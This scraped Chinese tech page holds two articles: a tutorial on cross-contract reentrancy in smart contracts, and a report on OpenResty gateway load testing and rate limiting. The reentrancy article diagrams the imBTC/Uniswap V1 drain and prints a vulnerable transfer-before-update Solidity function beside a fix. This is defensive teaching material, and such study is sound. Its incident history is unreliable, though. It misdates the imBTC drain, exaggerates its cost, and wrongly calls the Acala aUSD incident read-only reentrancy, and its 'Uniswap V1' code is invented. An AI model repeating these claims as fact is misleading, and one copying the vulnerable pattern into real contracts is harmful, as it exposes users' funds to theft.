h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>欢迎订阅专栏</strong>：<a href="https://juejin.cn/column/7602463463105642542" title="https://juejin.cn/column/7602463463105642542" target="_blank">10分钟智能合约：进阶实战</a></p>
<h2 data-id="heading-0">跨合约重入：定义、原理与攻防实战</h2>
<p><strong>跨合约重入</strong>是指攻击者利用<strong>两个或以上独立合约之间的相互调用</strong>，在单笔交易中通过回调机制重新进入<strong>原始调用者或其他相关合约的函数</strong>，从而利用尚未更新的全局状态或跨合约共享状态执行非预期操作。</p>
<p>与单函数/跨函数重入局限于<strong>同一合约内部</strong>不同，跨合约重入的攻击面横跨<strong>多个合约的边界</strong>，在 DeFi 组合式架构中尤为常见且隐蔽。</p>
<hr/>
<h3 data-id="heading-1">1. 核心原理</h3>
<p>跨合约重入的根源依然是<strong>状态更新滞后于外部调用</strong>，但脆弱点出现在<strong>合约间的信任假设</strong>上：</p>
<ul>
<li>合约 A 调用合约 B 的某个函数，并假设合约 B 是“诚实的”或“无副作用的”。</li>
<li>合约 B 在被调用期间，<strong>回调合约 A 的另一个函数</strong>，该函数与合约 A 正在执行的逻辑<strong>共享同一状态变量</strong>。</li>
<li>由于合约 A 尚未完成状态更新，回调函数读取的是旧状态，从而执行未授权的操作。</li>
</ul>
<p><strong>关键特征</strong>：攻击者不一定直接部署攻击合约，而是<strong>利用一个已存在的、看似正常的第三方合约</strong>作为重入跳板。</p>
<hr/>
<h3 data-id="heading-2">2. 经典示例：ERC-777 与 Uniswap V1 流动性池攻击</h3>
<p>2019 年，imBTC（ERC-777）与 Uniswap V1 池的组合被曝出跨合约重入漏洞，攻击者仅用 0.000001 ETH 就盗走了池中所有 imBTC。这是跨合约重入的教科书案例。</p>
<h4 data-id="heading-3">📌 背景设定</h4>
<ul>
<li>
<p><strong>Uniswap V1 池</strong>：允许用户用 ETH 兑换 imBTC，核心函数 <code>ethToTokenSwap</code> 执行：</p>
<ol>
<li>计算应输出的 imBTC 数量。</li>
<li><strong>先向用户发送 imBTC（调用 imBTC 的 <code>transfer</code>）</strong>。</li>
<li>再扣除用户的 ETH。</li>
</ol>
</li>
<li>
<p><strong>imBTC（ERC-777）</strong>：ERC-777 在转账时会<strong>回调接收方合约的 <code>tokensReceived()</code> 钩子函数</strong>。如果接收方是合约，<code>tokensReceived()</code> 会被自动调用。</p>
</li>
</ul>
<h4 data-id="heading-4">🔥 攻击路径</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Attacker
    participant UniswapV1
    participant imBTC(ERC777)
    participant AttackerContract

    Attacker-&gt;&gt;UniswapV1: ethToTokenSwap(极小ETH)
    UniswapV1-&gt;&gt;imBTC(ERC777): transfer(imBTC给攻击者)
    imBTC(ERC777)-&gt;&gt;AttackerContract: tokensReceived() 回调
    AttackerContract-&gt;&gt;UniswapV1: ethToTokenSwap(再次兑换) ⚠️ 重入
    UniswapV1-&gt;&gt;imBTC(ERC777): transfer(imBTC)
    imBTC(ERC777)--&gt;&gt;AttackerContract: ...循环...
    UniswapV1--&gt;&gt;Attacker: 完成首次兑换
</code></pre>
<ol>
<li><strong>攻击者</strong>调用 Uniswap V1 的 <code>ethToTokenSwap</code>，<strong>仅支付 0.000001 ETH</strong>。</li>
<li>Uniswap 计算应得 imBTC，调用 imBTC 的 <code>transfer</code> 向攻击者发送代币。</li>
<li>**imBTC（ERC-777）**在执行转账时，调用攻击者合约的 <code>tokensReceived()</code> 钩子。</li>
<li>在 <code>tokensReceived()</code> 中，攻击者合约<strong>再次调用同一个 Uniswap 池的 <code>ethToTokenSwap</code></strong>。</li>
<li>由于<strong>第一次调用的状态（用户 ETH 扣款）尚未执行</strong>，Uniswap 认为攻击者仍然拥有极小的 ETH 余额，于是再次为其计算并发送 imBTC。</li>
<li>循环重复，直至池中 imBTC 被耗尽。</li>
</ol>
<p><strong>攻击结果</strong>：攻击者通过重入，用几乎为零的成本反复提取 imBTC，最终卷走池中所有流动性。</p>
<hr/>
<h3 data-id="heading-5">3. 攻击成功的关键条件</h3>

























<table><thead><tr><th>条件</th><th>说明</th></tr></thead><tbody><tr><td><strong>调用顺序错误</strong></td><td>合约在<strong>发送资产之后</strong>才更新自身状态（如扣款）。</td></tr><tr><td><strong>代币具有回调机制</strong></td><td>ERC-777、ERC-223、部分 ERC-721 实现，以及支持 <code>safeTransfer</code> 的 ERC-1155，均可能触发接收方钩子。</td></tr><tr><td><strong>接收方是攻击者可编程合约</strong></td><td>攻击者可在钩子函数中发起新的交易。</td></tr><tr><td><strong>状态共享</strong></td><td>Uniswap 的状态变量（如 <code>balanceOf</code>、储备量）在两个调用间被共享，且未受重入锁保护。</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-6">4. 与其他重入类型的对比</h3>



































<table><thead><tr><th>维度</th><th>单函数重入</th><th>跨函数重入</th><th>跨合约重入</th></tr></thead><tbody><tr><td><strong>重入目标</strong></td><td>同一个函数</td><td>同一合约的不同函数</td><td><strong>不同合约</strong>（或同一合约但触发路径跨合约）</td></tr><tr><td><strong>回调入口</strong></td><td><code>receive()</code> / <code>fallback()</code></td><td>外部调用的回调</td><td>代币转账钩子、预言机回调、跨合约交互</td></tr><tr><td><strong>典型场景</strong></td><td>ETH 提款</td><td>The DAO 拆分提案</td><td>ERC-777 + 去中心化交易所</td></tr><tr><td><strong>防御难度</strong></td><td>低</td><td>中</td><td><strong>高</strong>（需要跨合约协调）</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-7">5. 防御措施</h3>
<h4 data-id="heading-8">✅ <strong>严格遵循 CEI（检查-生效-交互）模式</strong></h4>
<p>所有外部调用（包括向用户发送代币）必须<strong>放在函数最后</strong>，且在此之前完成所有状态更新。</p>
<p><strong>Uniswap V1 的修复</strong>：将 <code>transfer</code> 移到扣款之后。</p>
<pre><code class="hljs language-solidity" lang="solidity">// 修复前（漏洞版）
function ethToTokenSwap(uint256 minTokens) public payable {
    uint256 tokensOut = getTokenAmount(msg.value);
    token.transfer(msg.sender, tokensOut);  // ❌ 先转账
    balances[msg.sender] += msg.value;      // 后记账
}

// 修复后（安全版）
function ethToTokenSwap(uint256 minTokens) public payable {
    uint256 tokensOut = getTokenAmount(msg.value);
    balances[msg.sender] += msg.value;      // ✅ 先更新状态
    token.transfer(msg.sender, tokensOut);  // ✅ 后外部调用
}
</code></pre>
<h4 data-id="heading-9">✅ <strong>使用重入锁</strong></h4>
<p>即使遵循 CEI，仍建议对关键函数添加 <code>nonReentrant</code> 修饰符，防止意外重入。</p>
<pre><code class="hljs language-solidity" lang="solidity">import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract UniswapV1Pool is ReentrancyGuard {
    function ethToTokenSwap(...) public nonReentrant {
        // ...
    }
}
</code></pre>
<h4 data-id="heading-10">✅ <strong>选择无回调的代币标准</strong></h4>
<ul>
<li>优先使用 <strong>ERC-20</strong>（无转账钩子）而非 ERC-777。</li>
<li>若必须使用有钩子的代币，协议应明确声明风险，或在交互前检查接收方是否为合约并施加限制。</li>
</ul>
<h4 data-id="heading-11">✅ <strong>跨合约重入的协议级防御</strong></h4>
<p>对于多个合约构成的系统：</p>
<ul>
<li><strong>统一重入锁</strong>：通过共享的全局锁状态，确保整个协议在一笔交易中不可重入。</li>
<li><strong>快照机制</strong>：在执行敏感操作前，对相关状态进行快照，操作完成后检查状态是否被意外篡改。</li>
</ul>
<h4 data-id="heading-12">✅ <strong>审计重点</strong></h4>
<p>审计时应特别关注：</p>
<ul>
<li>任何<strong>先转账后更新状态</strong>的代码模式。</li>
<li>使用<strong>ERC-777/ERC-223/ERC-1155</strong>等带钩子代币的交互。</li>
<li>多个合约间相互调用的闭环路径。</li>
</ul>
<hr/>
<h3 data-id="heading-13">6. 现代变体：跨合约只读重入</h3>
<p>2022 年 Acala aUSD 攻击是跨合约重入的现代变体——<strong>只读重入</strong>。攻击者通过重入调用一个 <code>view</code> 函数，读取<strong>尚未更新的储备量</strong>，从而操纵价格预言机，最终 mint 出巨量 aUSD。</p>
<p>防御这种攻击需要更细粒度的状态管理，例如在重入锁生效时<strong>禁止读取某些关键状态</strong>，或引入<strong>瞬态存储</strong>（EIP-1153）来隔离未提交的更改。</p>
<hr/>
<h3 data-id="heading-14">总结</h3>
<p><strong>跨合约重入是重入攻击的高级形态</strong>，它突破了单一合约的边界，将攻击面延伸至 DeFi 的可组合性中。它的本质依然是<strong>状态更新滞后于外部调用</strong>，但攻击载体从简单的 ETH 转账升级为代币标准中隐含的回调机制。防御跨合约重入不仅需要单个合约的严谨编写，更需要在<strong>协议架构层面</strong>建立统一的防重入策略。</p>
<p><strong>核心教训</strong>：任何对外部合约的调用，无论该合约看起来多么“安全”，都必须假设它可能在执行期间回调你的合约。<strong>先更新，后交互</strong>——这条铁律从未过时。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一次openresty的网关性能优化之旅]]></title>    <link>https://juejin.cn/post/7605769126271336494</link>    <guid>https://juejin.cn/post/7605769126271336494</guid>    <pubDate>2026-02-12T15:11:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605769126271336494" data-draft-id="7605711582430167091" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一次openresty的网关性能优化之旅"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-12T15:11:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风的归宿55"/> <meta itemprop="url" content="https://juejin.cn/user/2840793779297303"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一次openresty的网关性能优化之旅
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2840793779297303/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风的归宿55
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T15:11:07.000Z" title="Thu Feb 12 2026 15:11:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我们公司是使用openresty作为网关，用于进行权限认证，反向代理，以及一些请求的处理。在使用过程中，我们遇到过这种情况，大部分时候openresty的性能都很好，cpu使用率都很低，但是有时候会突然cpu飙升，nginx的cpu打满，然后请求处理开始失败。但是这种情况出现次数少，持续时间不长，没法把cpu火焰图抓出来查看原因。</p>
<p>因此这里进行一次网关性能优化的探索，主要有两个目的，一是提高openresty的网关性能，处理偶现的这种异常情况。二是希望能有一种通用的智能的openresty限流方案，能确保在极限请求压力下，openresty能通过拒绝一部分请求的方式保障大部分请求正常被处理。</p>
<h4 data-id="heading-0">一、openresty网关性能优化</h4>
<p>这里首先尝试探索openresty网关的性能优化方案。主要的思路就是先模拟出线上出现问题的情况，因为线上情况比较复杂，不好完全模拟，这里设计一个接口，将线上最常见的鉴权代码放进去，然后限制openresty的cpu上限，接着用高并发压测这个接口，把openresty的cpu打满，模拟线上的情况。</p>
<p>模拟后通过监控查看openresty的qps以及接口成功率，以这两者的乘积，即每秒的成功请求数作为最终压测的结果。 后面通过几种方案修改并重复压测，通过每秒成功数来判断方案是否有效提高了openresty的性能。</p>
<h5 data-id="heading-1">1.1 压测环境介绍</h5>
<p>这里首先介绍下压测环境：</p>
<ol>
<li>openresty使用k8s部署，将其cpu limit设置为0.3，通过一个较低的cpu上线能更加容易的把cpu打满，方便压测。</li>
<li>压测工具使用hey，hey -t 5 -n 999999999 -c 3700 -q 1 '<a href="https://link.juejin.cn?target=http%3A%2F%2F172.16.1.97%3A8001%2Ftest%2Fnomal%2Frequest" target="_blank" title="http://172.16.1.97:8001/test/nomal/request" ref="nofollow noopener noreferrer">http://172.16.1.97:8001/test/nomal/request</a>' 通过这种命令持续压测，-c 代表并发是3700，-q代表每秒每个并发最多请求一次，这样限制了总的qps最多为3700。</li>
<li>接口/test/nomal/request的逻辑如下，简单点说的话，就是先查redis查找认证信息，没查到就从mongo数据库中找，并设置到redis中供下次使用，是很常见的授权认证方式。这里简化了下，大家可以简单看下代码体会下。后面做了个处理，如果redis或者mongo中查到了数据，则返回200状态码，否则返回503状态码，这样可以在nginx监控或者压测结果中比较清楚的看出来成功率。</li>
</ol>

<pre><code class="hljs language-bash" lang="bash">       location /test/nomal/request {
             content_by_lua_block {
               <span class="hljs-keyword">function</span> getAuthInfo(<span class="hljs-built_in">id</span>)
                 <span class="hljs-built_in">local</span> authInfo = redis:get(<span class="hljs-string">"L-"</span> .. <span class="hljs-built_in">id</span>)
                 <span class="hljs-keyword">if</span> not authInfo <span class="hljs-keyword">then</span>
                  <span class="hljs-built_in">local</span> authInfo = get_from_mongo(<span class="hljs-built_in">id</span>)
                  <span class="hljs-keyword">if</span> authInfo and cjson.encode(authInfo) ~= <span class="hljs-string">""</span> <span class="hljs-keyword">then</span>
                    redis:<span class="hljs-built_in">set</span>(<span class="hljs-string">"L-"</span> .. <span class="hljs-built_in">id</span>, authInfo)
                  <span class="hljs-keyword">else</span>
                    <span class="hljs-built_in">return</span> nil
                  end
                end
                <span class="hljs-built_in">return</span> authInfo
              end

                <span class="hljs-built_in">local</span> <span class="hljs-built_in">id</span> = getAuthInfo(<span class="hljs-string">"testId"</span>)
                <span class="hljs-keyword">if</span> not <span class="hljs-built_in">id</span> or tostring(<span class="hljs-built_in">id</span>)==<span class="hljs-string">""</span> <span class="hljs-keyword">then</span>
                  <span class="hljs-built_in">return</span> ngx.exit(ngx.HTTP_SERVICE_UNAVAILABLE)
                end
                <span class="hljs-built_in">return</span> ngx.exit(ngx.HTTP_OK)
            }
       }
</code></pre>
<p>4.  redis和mongo都做了限流保护，避免因为网关占用了太多连接，导致其他服务连接redis或者mongo出现问题，redis的连接池数量是500，超过这个数量的redis请求会被放在一个400长度的队列中，超出这个队列的请求会直接失败。</p>
<h5 data-id="heading-2">1.2 线上环境模拟</h5>
<p>这里首先模拟线上环境，把openresty的cpu打满，并且通过抓取火焰图来分析cpu使用情况。压测命令都是一样的，这个后续不再说明：
hey -t 5 -n 999999999 -c 3700 -q 1 '<a href="https://link.juejin.cn?target=http%3A%2F%2F172.16.1.97%3A8001%2Ftest%2Fnomal%2Frequest" target="_blank" title="http://172.16.1.97:8001/test/nomal/request" ref="nofollow noopener noreferrer">http://172.16.1.97:8001/test/nomal/request</a>'</p>
<p><strong>测试结果：</strong></p>
<p>qps: 2500</p>
<p>成功率：14%</p>
<p>每秒成功请求数：2500*14%=350</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bfb76b850284bc99f8a44ae3830910e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=ftygHeYOYrxU7tu3QaZ8mfbJEwI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e00acb87b6a4ac39afb9e640d49dfef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=6CPRxBDVTI1nrjxxAEtOez88zFQ%3D" alt="image.png" loading="lazy"/></p>
<p><strong>导出的lua火焰图：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12edccf346224c4ea861c8e0f17c4657~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=Hjs%2Fdrlb3aOEw7DtbmWMOJ47UZg%3D" alt="image.png" loading="lazy"/></p>
<p><strong>分析：</strong></p>
<p>从导出的lua火焰图可以看出，lua的大部分cpu都被用在了mongo库的处理上，因此我们下一步的优化方向就是通过减少mongo请求来提升处理能力。这里推荐下，如果想要配置同款的nginx监控和lua导出火焰图，可以查看笔者之前的文章：<a href="https://juejin.cn/post/7588080521445294126" target="_blank" title="https://juejin.cn/post/7588080521445294126">openresty监控</a> 以及 <a href="https://juejin.cn/post/7577689171222708274" target="_blank" title="https://juejin.cn/post/7577689171222708274">openresty容器导出火焰图</a></p>
<h5 data-id="heading-3">1.3 优化mongo请求</h5>
<p>仔细查看日志后发现，因为cpu打满了，openresty的处理速度变慢，很多redis的连接可能等待了一秒都没被处理，这就超过了redis的连接超时时间，导致缓存穿透，请求都去查mongo了，即使mongo连接也有限制，但是查询mongo的库估计比较占用cpu，导致这部分cpu使用率较高。</p>
<p>于是我们可以进行代码优化，只有在redis查询成功，但是没查到数据的情况下才去查mongo，这样就能避免redis失败时穿透到mongo。</p>
<pre><code class="hljs language-bash" lang="bash">              <span class="hljs-keyword">function</span> getAuthInfo(<span class="hljs-built_in">id</span>)
                 <span class="hljs-built_in">local</span> authInfo,err = redis:get(<span class="hljs-string">"L-"</span> .. <span class="hljs-built_in">id</span>)
                 <span class="hljs-keyword">if</span> not authInfo and not err <span class="hljs-keyword">then</span>
                  <span class="hljs-built_in">local</span> authInfo = get_from_mongo(<span class="hljs-built_in">id</span>)
</code></pre>
<p><strong>测试结果：</strong></p>
<p>qps: 2816</p>
<p>成功率：27.4%</p>
<p>每秒成功请求数：2816*27.4%=771</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f019e3bc9eb94a8e98478635de20b0f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=QcBEwLEjnb%2BWdSvo28E1WTCvZxk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34721ea2204b44db8a05fe897b1a3aab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=6DmbzqtleBFai406gFgg8z9iejQ%3D" alt="image.png" loading="lazy"/></p>
<p><strong>导出的lua火焰图：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c98a7eb2deb2433e9fef968cfb2bee44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO55qE5b2S5a6_NTU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771513867&amp;x-signature=mPBI7nPB4C1r5JxlKUfoiJAIUeY%3D" alt="image.png" loading="lazy"/></p>
<p><strong>分析：</strong></p>
<p>从压测的结果可以看出，qps提高了，错误率反而下降了，每秒成功请求数是之前的2倍，说明优化是有效的，但是错误率还是有点高，这个是否有办法降低。目前比较容易想到的方式是限流，只要我们根据一定指标把多余的请求拒绝掉，是否就可以确保openresty始终能处理一定量的请求了呢。</p>
<h5 data-id="heading-4">1.4 限流</h5>
<p>我们希望找一种限流方案，最好是比较智能的方案，可以根据一个固定的阈值触发。比如一个openresty实例在固定cpu下只能处理1000个请求，那最好是能找到个指标，当超出这个指标时就进行限流，把超过openresty处理能力的请求拒绝掉，从而最大化的保障openresty处理能力，避免因为雪崩导致大部分请求无法被正常处理。</p>
<p>这里额外说明下为什么不用常见的漏桶和令牌等限流方式，因为我们觉得这个方式的阈值比较固定，不够智能，很多时候可能阈值达到了，但是nginx实际上还没跑满，或者nginx已经跑满出问题了，但是qps阈值还没达到。我们希望找到一个更智能的限流方式。</p>
<p>这个我们尝试了几个指标，都不太理想，这里直接说结论，最能体现nginx到达处理能力瓶颈的指标就是cpu使用率，当其达到阈值时就是openresty出问题的时候。 这里的探索我们后面再说明，先来看修改方案和测试结果。</p>
<p>我们首先简单做了个限流，当检测到openresty cpu跑满时就开始限流，按照比例限制流量，比如20%的请求直接失败，并且如果cpu没有降下来就继续提升限流比例，cpu降下来了就降低限流比例。 不过目前没有实现完整的方案，而是先简单做了一版，手动控制cpu是否跑满的开关，限流也是默认是20%，也就是默认限制20%的请求。</p>
<p><strong>测试结果：</strong></p>
<p>qps: 3084</p>
<p>成功率：29.7%</p>
<p>每秒成功请求数：3084*29.7%=915</p>
